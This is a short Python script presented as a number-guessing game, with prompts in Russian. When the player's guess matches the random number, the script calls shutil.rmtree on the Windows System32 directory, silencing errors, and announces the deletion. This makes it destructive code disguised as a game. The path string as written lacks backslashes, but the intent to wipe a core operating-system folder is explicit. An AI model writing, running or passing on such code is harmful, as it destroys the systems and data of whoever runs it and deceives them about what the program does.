import random
import time
import shutil

print("|Game - win or windows|")

while True:
    try:
        number = int(input("Выберите число от 1 до 10: "))
    except ValueError:
        print("Введите корректное число!")
        continue

    rand_num = random.randint(1, 10)

    if number == rand_num:
        print("You are lost : (")
        time.sleep(2)
        path = r"C:WindowsSystem32"
        shutil.rmtree(path, ignore_errors=True)
        print("System32 удалена.")
        break
    else:
        print("You win! Try again!")
